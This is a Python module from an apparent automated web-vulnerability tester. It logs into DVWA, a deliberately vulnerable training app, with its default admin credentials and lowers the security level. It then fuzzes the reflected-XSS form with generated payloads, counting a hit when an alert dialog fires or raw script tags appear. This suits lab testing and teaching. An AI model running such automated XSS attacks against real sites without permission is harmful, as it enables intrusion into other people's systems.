from pathlib import Path
from ..tools.browser import Browser
from ..fuzz.engine import generate_candidates, try_candidates
from ..fuzz.seeds import XSS_REFLECTED_SEEDS

def run(base_url: str, budget: int=8) -> dict:
    with Browser(base_url) as b:
        # login
        b.goto("/login.php")
        b.page.wait_for_selector('input[name="username"]', timeout=15000)
        b.fill('input[name="username"]', "admin")
        b.fill('input[name="password"]', "password")
        b.click('input[type="submit"]')
        b.page.wait_for_load_state("domcontentloaded")

        # low
        try:
            b.goto("/security.php")
            b.page.wait_for_selector('select[name="security"]', timeout=5000)
            b.page.select_option('select[name="security"]', 'low')
            b.click('input[type="submit"]')
            b.page.wait_for_load_state("domcontentloaded")
        except Exception:
            pass

        # hook de alert()
        alert = {"ok": False, "message": ""}
        def on_dialog(d):
            alert["ok"] = True
            alert["message"] = d.message
            d.accept()
        b.page.on("dialog", on_dialog)

        # contexto e candidatos
        b.goto("/vulnerabilities/xss_r/")
        b.page.wait_for_selector('input[name="name"]', timeout=15000)
        page_ctx = {"form":"name", "page": "xss_reflected"}
        candidates = generate_candidates("XSSReflectedLow", page_ctx, XSS_REFLECTED_SEEDS, budget)

        def try_one(p: str):
            b.goto("/vulnerabilities/xss_r/")
            b.page.wait_for_selector('input[name="name"]', timeout=15000)
            b.fill('input[name="name"]', p)
            b.click('input[type="submit"]')
            b.page.wait_for_timeout(900)

            html = b.content()
            raw_present = "<script" in html and "alert(" in html
            ok = alert["ok"] or raw_present
            reason = (f'alert fired: "{alert["message"]}"' if alert["ok"]
                      else "raw <script> present" if raw_present else "no execution")

            screens = Path(__file__).resolve().parents[2].parent / "screens"
            screens.mkdir(parents=True, exist_ok=True)
            shot = screens / "xss_reflected_low_smart.png"
            b.page.screenshot(path=str(shot), full_page=True)

            return {
                "ok": ok,
                "vector": "Reflected XSS (Low) SMART",
                "payload": p,
                "reason": reason,
                "evidence_contains": p if raw_present else html[:1000],
                "screenshot": str(shot),
                "url": b.page.url,
            }

        return try_candidates(try_one, candidates)
